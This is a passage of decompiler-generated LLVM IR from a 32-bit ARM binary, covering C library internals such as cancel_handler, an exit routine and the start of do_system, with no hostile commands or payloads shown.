  %v2_19d3c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_19d3c, i32* %r4.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v2_19d48 = add i32 %v2_19d3c, 64
  %v3_19d48 = inttoptr i32 %v2_19d48 to i32*
  %v4_19d48 = load i32, i32* %v3_19d48, align 4
  store i32 %v4_19d48, i32* %ip.global-to-local, align 4
  store i32 %v2_19d20, i32* %r3.global-to-local, align 4
  %v2_19d58 = add i32 %v0_19d30, -1040
  %v3_19d58 = inttoptr i32 %v2_19d58 to i32*
  store i32 %v2_19d20, i32* %v3_19d58, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_19d64 = load i32, i32* %ip.global-to-local, align 4
  %v1_19d64 = inttoptr i32 %v0_19d64 to i32*
  %v2_19d64 = load i32, i32* %v1_19d64, align 4
  store i32 %v2_19d64, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_19d74 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19e18

dec_label_pc_19d7c:                               ; preds = %dec_label_pc_19d20
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_19d80 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_19d80, i32* %ip.global-to-local, align 4
  %v2_19d84 = add i32 %v2_19d80, 48
  %v3_19d84 = inttoptr i32 %v2_19d84 to i32*
  %v4_19d84 = load i32, i32* %v3_19d84, align 4
  store i32 %v4_19d84, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_19d84)
  store i32 132, i32* %r3.global-to-local, align 4
  %v2_19d94 = load i32, i32* %stack_var_-416, align 4
  %v2_19d98 = add i32 %v2_19d94, 132
  %v3_19d98 = inttoptr i32 %v2_19d98 to i32*
  %v4_19d98 = load i32, i32* %v3_19d98, align 4
  store i32 %v4_19d98, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19d9c

dec_label_pc_19d9c:                               ; preds = %dec_label_pc_19dd0.dec_label_pc_19d9c_crit_edge, %dec_label_pc_19d7c
  %v0_19d9c = phi i32 [ %v0_19d9c.pre, %dec_label_pc_19dd0.dec_label_pc_19d9c_crit_edge ], [ %v4_19d98, %dec_label_pc_19d7c ]
  %v1_19d9c = inttoptr i32 %v0_19d9c to i32*
  %v2_19d9c = load i32, i32* %v1_19d9c, align 4
  store i32 %v0_19d9c, i32* %r2.global-to-local, align 4
  store i32 %v2_19d9c, i32* %r4.global-to-local, align 4
  %v1_19da8 = add i32 %v2_19d9c, -1
  store i32 %v1_19da8, i32* %r1.global-to-local, align 4
  %v2_19dac88 = load i32, i32* %v1_19d9c, align 4
  store i32 %v2_19dac88, i32* %r3.global-to-local, align 4
  %v3_19db090 = icmp uge i32 %v2_19dac88, %v2_19d9c
  store i1 %v3_19db090, i1* %cpsr_c.global-to-local, align 1
  %v9_19db096 = icmp eq i32 %v2_19dac88, %v2_19d9c
  store i1 %v9_19db096, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19db096, label %dec_label_pc_19db8, label %dec_label_pc_19dd0

dec_label_pc_19db8:                               ; preds = %dec_label_pc_19d9c, %dec_label_pc_19db8.dec_label_pc_19dac_crit_edge
  %v0_19db897 = phi i32 [ %v1_19db0.pre, %dec_label_pc_19db8.dec_label_pc_19dac_crit_edge ], [ %v2_19d9c, %dec_label_pc_19d9c ]
  store i32 %v0_19db897, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_19dc8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_19dc8, label %dec_label_pc_19dcc, label %dec_label_pc_19db8.dec_label_pc_19dac_crit_edge

dec_label_pc_19db8.dec_label_pc_19dac_crit_edge:  ; preds = %dec_label_pc_19db8
  %v0_19dac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_19db0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_19dac = inttoptr i32 %v0_19dac.pre to i32*
  %v2_19dac = load i32, i32* %v1_19dac, align 4
  store i32 %v2_19dac, i32* %r3.global-to-local, align 4
  %v3_19db0 = icmp uge i32 %v2_19dac, %v1_19db0.pre
  store i1 %v3_19db0, i1* %cpsr_c.global-to-local, align 1
  %v9_19db0 = icmp eq i32 %v2_19dac, %v1_19db0.pre
  store i1 %v9_19db0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19db0, label %dec_label_pc_19db8, label %dec_label_pc_19dd0

dec_label_pc_19dcc:                               ; preds = %dec_label_pc_19db8
  %v0_19dcc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_19dcc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_19dd0

dec_label_pc_19dd0:                               ; preds = %dec_label_pc_19d9c, %dec_label_pc_19db8.dec_label_pc_19dac_crit_edge, %dec_label_pc_19dcc
  %v0_19dd8 = phi i32 [ %v0_19dcc, %dec_label_pc_19dcc ], [ %v2_19dac88, %dec_label_pc_19d9c ], [ %v2_19dac, %dec_label_pc_19db8.dec_label_pc_19dac_crit_edge ]
  %v1_19dd0 = phi i32 [ %v0_19dcc, %dec_label_pc_19dcc ], [ %v2_19d9c, %dec_label_pc_19d9c ], [ %v1_19db0.pre, %dec_label_pc_19db8.dec_label_pc_19dac_crit_edge ]
  %v3_19dd0 = icmp uge i32 %v0_19dd8, %v1_19dd0
  store i1 %v3_19dd0, i1* %cpsr_c.global-to-local, align 1
  %v9_19dd0 = icmp eq i32 %v0_19dd8, %v1_19dd0
  store i1 %v9_19dd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19dd0, label %dec_label_pc_19dd8, label %dec_label_pc_19dd0.dec_label_pc_19d9c_crit_edge

dec_label_pc_19dd0.dec_label_pc_19d9c_crit_edge:  ; preds = %dec_label_pc_19dd0
  %v0_19d9c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19d9c

dec_label_pc_19dd8:                               ; preds = %dec_label_pc_19dd0
  %v2_19dd8 = icmp ne i32 %v1_19dd0, 0
  store i1 %v2_19dd8, i1* %cpsr_c.global-to-local, align 1
  %v7_19dd8 = icmp eq i32 %v1_19dd0, 1
  store i1 %v7_19dd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19dd8, label %dec_label_pc_19e18, label %dec_label_pc_19de0

dec_label_pc_19de0:                               ; preds = %dec_label_pc_19dd8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19e18

dec_label_pc_19e18:                               ; preds = %dec_label_pc_19dd8, %dec_label_pc_19de0, %dec_label_pc_19d30
  %storemerge2 = phi i32 [ %v0_19d74, %dec_label_pc_19d30 ], [ 0, %dec_label_pc_19de0 ], [ 0, %dec_label_pc_19dd8 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_19e1c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_19e1c, i32* %r0.global-to-local, align 4
  %v0_19e20 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19e20, label %.thread8, label %.thread9

.thread8:                                         ; preds = %dec_label_pc_19e18
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  call void @llvm.trap()
  unreachable

.thread9:                                         ; preds = %dec_label_pc_19e18
  ret i32 %v1_19e1c

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_19dd0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_19dcc, { 1, 0, 2 }
  uselistorder i32 %v1_19db0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_19d9c, { 1, 0 }
  uselistorder i32 %v2_19cfc, { 1, 0 }
  uselistorder i32 %v2_19cd4.pre, { 2, 0, 1 }
  uselistorder i32 %v1_19cc8, { 1, 0 }
  uselistorder i32 %v1_19cc4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_19cb8, { 1, 0 }
  uselistorder i32 %v1_19c84, { 1, 0 }
  uselistorder i32 %v1_19c80, { 1, 2, 3, 0 }
  uselistorder i32 %v1_19c74, { 1, 0 }
  uselistorder i32 %v2_19c50, { 1, 0, 2 }
  uselistorder i32 %v4_19c34, { 1, 0, 2 }
  uselistorder i32 %v4_19c24, { 1, 0, 2, 3 }
  uselistorder i1 %v8_19b6c, { 1, 2, 0 }
  uselistorder i32 %v2_19b38, { 1, 2, 0 }
  uselistorder i32 %v1_19b34, { 1, 2, 0 }
  uselistorder i1 %v2_19b20, { 1, 0, 2 }
  uselistorder i32 %v5_19b24, { 1, 0, 2, 3 }
  uselistorder i32 %v2_19af0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_19ad8, { 1, 0, 2 }
  uselistorder i32 %v2_19acc, { 1, 0, 2 }
  uselistorder i32 %v3_19a9c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 3, 1, 2, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 6, 7, 8, 9, 13, 10, 11, 12, 18, 14, 15, 16, 17, 20, 19, 21, 22, 1, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 7, 3, 4, 5, 6, 2, 8, 9, 10, 11, 25, 12, 13, 1, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 0, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 5, 7, 6, 1, 8, 9, 10, 12, 11, 28, 13, 15, 14, 29, 16, 17, 18, 19, 20, 21, 22, 23, 24, 27, 25, 26, 0, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 132, { 0, 1, 5, 6, 7, 8, 2, 3, 4 }
  uselistorder i32 108, { 0, 1, 3, 4, 5, 2 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 27696, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19e18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19dd0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19db8, { 1, 0 }
  uselistorder label %dec_label_pc_19d20, { 1, 0 }
  uselistorder label %dec_label_pc_19cf8, { 1, 0 }
  uselistorder label %dec_label_pc_19c74, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19bf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19bc8, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_19b38, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_19b20, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @cancel_handler(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_19e6c = load i32, i32* @r4, align 4
  store i32 %v3_19e6c, i32* %stack_var_-20, align 4
  %v2_19e70 = load i32, i32* %arg1, align 4
  store i32 %v2_19e70, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r5, align 4
  store i32 %v2_19e70, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  store i32 37, i32* @r7, align 4
  store i32 98768, i32* @r6, align 4
  br label %dec_label_pc_19e94

dec_label_pc_19e94:                               ; preds = %dec_label_pc_19eac.dec_label_pc_19e94_crit_edge, %entry
  %v0_19e98 = phi i32 [ %v0_19e98.pre, %dec_label_pc_19eac.dec_label_pc_19e94_crit_edge ], [ %v2_19e70, %entry ]
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_19e98, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_19ea0 = call i32 @__libc_waitpid(i32 %v0_19e98, i32 0, i32 0)
  store i32 %v3_19ea0, i32* %r0.global-to-local, align 4
  %v3_19ea4 = icmp eq i32 %v3_19ea0, -1
  store i1 %v3_19ea4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_19ea4, label %dec_label_pc_19eac, label %dec_label_pc_19ec0

dec_label_pc_19eac:                               ; preds = %dec_label_pc_19e94
  %v0_19eac = call i32 @__aeabi_read_tp()
  store i32 %v0_19eac, i32* %r0.global-to-local, align 4
  %v3_19eb0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_19eb0 = sext i16 %v3_19eb0 to i32
  %v2_19eb4 = add i32 %v4_19eb0, %v0_19eac
  %v3_19eb4 = inttoptr i32 %v2_19eb4 to i32*
  %v4_19eb4 = load i32, i32* %v3_19eb4, align 4
  %v2_19eb8 = icmp ugt i32 %v4_19eb4, 3
  store i1 %v2_19eb8, i1* %cpsr_c.global-to-local, align 1
  %v7_19eb8 = icmp eq i32 %v4_19eb4, 4
  br i1 %v7_19eb8, label %dec_label_pc_19eac.dec_label_pc_19e94_crit_edge, label %dec_label_pc_19ec0

dec_label_pc_19eac.dec_label_pc_19e94_crit_edge:  ; preds = %dec_label_pc_19eac
  %v0_19e98.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19e94

dec_label_pc_19ec0:                               ; preds = %dec_label_pc_19e94, %dec_label_pc_19eac
  store i32 27744, i32* @r7, align 4
  %v0_19ec4 = load i32, i32* @r5, align 4
  %v2_19ec4 = add i32 %v0_19ec4, 27744
  store i32 %v2_19ec4, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_19ec4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_19ed435 = inttoptr i32 %v2_19ec4 to i32*
  %v2_19ed436 = load i32, i32* %v1_19ed435, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_19ed838 = icmp eq i32 %v2_19ed436, 0
  br i1 %v9_19ed838, label %dec_label_pc_19ee0, label %dec_label_pc_19ef8

dec_label_pc_19ee0:                               ; preds = %dec_label_pc_19ec0, %dec_label_pc_19ee0.dec_label_pc_19ed4_crit_edge
  %v0_19ee039 = phi i32 [ %v1_19ed8.pre, %dec_label_pc_19ee0.dec_label_pc_19ed4_crit_edge ], [ 0, %dec_label_pc_19ec0 ]
  store i32 %v0_19ee039, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_19ef0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_19ef0, label %dec_label_pc_19ef4, label %dec_label_pc_19ee0.dec_label_pc_19ed4_crit_edge

dec_label_pc_19ee0.dec_label_pc_19ed4_crit_edge:  ; preds = %dec_label_pc_19ee0
  %v0_19ed4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_19ed8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_19ed4 = inttoptr i32 %v0_19ed4.pre to i32*
  %v2_19ed4 = load i32, i32* %v1_19ed4, align 4
  %v3_19ed8 = icmp uge i32 %v2_19ed4, %v1_19ed8.pre
  store i1 %v3_19ed8, i1* %cpsr_c.global-to-local, align 1
  %v9_19ed8 = icmp eq i32 %v2_19ed4, %v1_19ed8.pre
  br i1 %v9_19ed8, label %dec_label_pc_19ee0, label %dec_label_pc_19ef8

dec_label_pc_19ef4:                               ; preds = %dec_label_pc_19ee0
  %v0_19ef4 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19ef8

dec_label_pc_19ef8:                               ; preds = %dec_label_pc_19ec0, %dec_label_pc_19ee0.dec_label_pc_19ed4_crit_edge, %dec_label_pc_19ef4
  %v0_19ef8 = phi i32 [ %v0_19ef4, %dec_label_pc_19ef4 ], [ %v2_19ed436, %dec_label_pc_19ec0 ], [ %v2_19ed4, %dec_label_pc_19ee0.dec_label_pc_19ed4_crit_edge ]
  %v1_19ef8 = phi i32 [ %v0_19ef4, %dec_label_pc_19ef4 ], [ 0, %dec_label_pc_19ec0 ], [ %v1_19ed8.pre, %dec_label_pc_19ee0.dec_label_pc_19ed4_crit_edge ]
  %v3_19ef8 = icmp uge i32 %v0_19ef8, %v1_19ef8
  store i1 %v3_19ef8, i1* %cpsr_c.global-to-local, align 1
  %v9_19ef8 = icmp eq i32 %v0_19ef8, %v1_19ef8
  br i1 %v9_19ef8, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_19ef8
  %v1_19efc = load i32, i32* @r6, align 4
  store i32 %v1_19efc, i32* %r0.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_19ef8, %bb
  store i32 106244, i32* @lr, align 4
  %v1_19f00 = xor i1 %v9_19ef8, true
  call void @__pseudo_cond_branch(i1 %v1_19f00, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  store i32 27740, i32* %r2.global-to-local, align 4
  %v0_19f08 = load i32, i32* @r5, align 4
  %v2_19f08 = add i32 %v0_19f08, 27740
  %v3_19f08 = inttoptr i32 %v2_19f08 to i32*
  %v4_19f08 = load i32, i32* %v3_19f08, align 4
  %v1_19f0c = add i32 %v4_19f08, -1
  store i32 %v1_19f0c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19f10 = icmp eq i32 %v1_19f0c, 0
  store i32 %v1_19f0c, i32* %v3_19f08, align 4
  br i1 %v2_19f10, label %dec_label_pc_19f1c, label %dec_label_pc_19f44

dec_label_pc_19f1c:                               ; preds = %bb18
  %v0_19f20 = load i32, i32* @r4, align 4
  store i32 %v0_19f20, i32* %r2.global-to-local, align 4
  %v0_19f24 = load i32, i32* @r5, align 4
  %v2_19f24 = add i32 %v0_19f24, 27720
  store i32 %v2_19f24, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v3_19f2c = call i32 @__libc_sigaction(i32 3, i32 %v2_19f24, i32 %v0_19f20)
  %v0_19f34 = load i32, i32* @r4, align 4
  store i32 %v0_19f34, i32* %r2.global-to-local, align 4
  %v0_19f38 = load i32, i32* @r5, align 4
  %v2_19f38 = add i32 %v0_19f38, 27700
  store i32 %v2_19f38, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_19f40 = call i32 @__libc_sigaction(i32 2, i32 %v2_19f38, i32 %v0_19f34)
  store i32 %v3_19f40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19f44

dec_label_pc_19f44:                               ; preds = %bb18, %dec_label_pc_19f1c, %dec_label_pc_19f74
  %v0_19f44 = load i32, i32* @r5, align 4
  %v1_19f44 = load i32, i32* @r7, align 4
  %v2_19f44 = add i32 %v1_19f44, %v0_19f44
  %v3_19f44 = inttoptr i32 %v2_19f44 to i32*
  %v4_19f44 = load i32, i32* %v3_19f44, align 4
  store i32 %v4_19f44, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_19f4c = load i32, i32* @r6, align 4
  store i32 %v0_19f4c, i32* %r2.global-to-local, align 4
  %v1_19f5023 = inttoptr i32 %v0_19f4c to i32*
  %v2_19f5024 = load i32, i32* %v1_19f5023, align 4
  %v3_19f5426 = icmp uge i32 %v2_19f5024, %v4_19f44
  store i1 %v3_19f5426, i1* %cpsr_c.global-to-local, align 1
  %v9_19f5432 = icmp eq i32 %v2_19f5024, %v4_19f44
  br i1 %v9_19f5432, label %dec_label_pc_19f5c, label %dec_label_pc_19f74

dec_label_pc_19f5c:                               ; preds = %dec_label_pc_19f44, %dec_label_pc_19f5c.dec_label_pc_19f50_crit_edge
  %v0_19f5c33 = phi i32 [ %v1_19f54.pre, %dec_label_pc_19f5c.dec_label_pc_19f50_crit_edge ], [ %v4_19f44, %dec_label_pc_19f44 ]
  store i32 %v0_19f5c33, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_19f6c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_19f6c, label %dec_label_pc_19f70, label %dec_label_pc_19f5c.dec_label_pc_19f50_crit_edge

dec_label_pc_19f5c.dec_label_pc_19f50_crit_edge:  ; preds = %dec_label_pc_19f5c
  %v0_19f50.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_19f54.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_19f50 = inttoptr i32 %v0_19f50.pre to i32*
  %v2_19f50 = load i32, i32* %v1_19f50, align 4
  %v3_19f54 = icmp uge i32 %v2_19f50, %v1_19f54.pre
  store i1 %v3_19f54, i1* %cpsr_c.global-to-local, align 1
  %v9_19f54 = icmp eq i32 %v2_19f50, %v1_19f54.pre
  br i1 %v9_19f54, label %dec_label_pc_19f5c, label %dec_label_pc_19f74

dec_label_pc_19f70:                               ; preds = %dec_label_pc_19f5c
  %v0_19f70 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19f74

dec_label_pc_19f74:                               ; preds = %dec_label_pc_19f44, %dec_label_pc_19f5c.dec_label_pc_19f50_crit_edge, %dec_label_pc_19f70
  %v0_19f7c = phi i32 [ %v0_19f70, %dec_label_pc_19f70 ], [ %v2_19f5024, %dec_label_pc_19f44 ], [ %v2_19f50, %dec_label_pc_19f5c.dec_label_pc_19f50_crit_edge ]
  %v1_19f74 = phi i32 [ %v0_19f70, %dec_label_pc_19f70 ], [ %v4_19f44, %dec_label_pc_19f44 ], [ %v1_19f54.pre, %dec_label_pc_19f5c.dec_label_pc_19f50_crit_edge ]
  %v3_19f74 = icmp uge i32 %v0_19f7c, %v1_19f74
  store i1 %v3_19f74, i1* %cpsr_c.global-to-local, align 1
  %v9_19f74 = icmp eq i32 %v0_19f7c, %v1_19f74
  br i1 %v9_19f74, label %dec_label_pc_19f7c, label %dec_label_pc_19f44

dec_label_pc_19f7c:                               ; preds = %dec_label_pc_19f74
  %v2_19f7c = icmp ne i32 %v1_19f74, 0
  store i1 %v2_19f7c, i1* %cpsr_c.global-to-local, align 1
  %v7_19f80 = icmp slt i32 %v1_19f74, 2
  br i1 %v7_19f80, label %dec_label_pc_19f7c.dec_label_pc_19f9c_crit_edge, label %dec_label_pc_19f84

dec_label_pc_19f7c.dec_label_pc_19f9c_crit_edge:  ; preds = %dec_label_pc_19f7c
  %v1_19fa4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19f9c

dec_label_pc_19f84:                               ; preds = %dec_label_pc_19f7c
  %v0_19f84 = load i32, i32* @r6, align 4
  store i32 %v0_19f84, i32* %r0.global-to-local, align 4
  %v0_19f88 = load i32, i32* %r1.global-to-local, align 4
  %v1_19f88 = add i32 %v0_19f88, 129
  store i32 %v1_19f88, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19f9c

dec_label_pc_19f9c:                               ; preds = %dec_label_pc_19f7c.dec_label_pc_19f9c_crit_edge, %dec_label_pc_19f84
  %v1_19fa4 = phi i32 [ %v1_19fa4.pre, %dec_label_pc_19f7c.dec_label_pc_19f9c_crit_edge ], [ %v0_19f84, %dec_label_pc_19f84 ]
  %v2_19fa0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_19fa0, i32* %r4.global-to-local, align 4
  ret i32 %v1_19fa4

; uselistorder directives
  uselistorder i32 %v0_19f70, { 1, 0 }
  uselistorder i32 %v1_19f54.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_19ef4, { 1, 0 }
  uselistorder i32 %v1_19ed8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_19e98, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 11, 2, 4, 3, 5, 6, 7, 8, 12, 9, 10, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 8, 9, 3, 4, 5, 10, 11, 6, 7 }
  uselistorder label %dec_label_pc_19f9c, { 1, 0 }
  uselistorder label %dec_label_pc_19f74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19f5c, { 1, 0 }
  uselistorder label %dec_label_pc_19f44, { 2, 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_19ef8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19ee0, { 1, 0 }
  uselistorder label %dec_label_pc_19ec0, { 1, 0 }
}

define i32 @function_19fb0(i32 %arg1) local_unnamed_addr {
dec_label_pc_19fb0:
  %v0_19fb0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19fb0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_19fb0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_19fb0, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @do_system() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %v3_19fc0 = load i32, i32* @r4, align 4
  %v6_19fc0 = load i32, i32* @r5, align 4
  %v9_19fc0 = load i32, i32* @r6, align 4
  %v12_19fc0 = load i32, i32* @r7, align 4
  %v15_19fc0 = load i32, i32* @r8, align 4
  %v21_19fc0 = load i32, i32* @lr, align 4
  %v2_19fc8 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_19fc8, i32* @r7, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v3_19fe0 = bitcast i32* %stack_var_-100 to i8*
  %v4_19fe0 = call i32 @__GI_memset(i8* %v3_19fe0, i32 0, i32 20)
  store i32 27744, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 27744), i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-100, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 27744), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1a000161 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 27744) to i32*), align 4
  store i32 %v2_1a000161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1a004163 = icmp eq i32 %v2_1a000161, 0
  br i1 %v9_1a004163, label %dec_label_pc_1a00c, label %dec_label_pc_1a024

dec_label_pc_1a00c:                               ; preds = %entry, %dec_label_pc_1a00c.dec_label_pc_1a000_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1a01c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1a01c, label %dec_label_pc_1a020, label %dec_label_pc_1a00c.dec_label_pc_1a000_crit_edge

dec_label_pc_1a00c.dec_label_pc_1a000_crit_edge:  ; preds = %dec_label_pc_1a00c
  %v0_1a000.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1a004.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1a000 = inttoptr i32 %v0_1a000.pre to i32*
  %v2_1a000 = load i32, i32* %v1_1a000, align 4
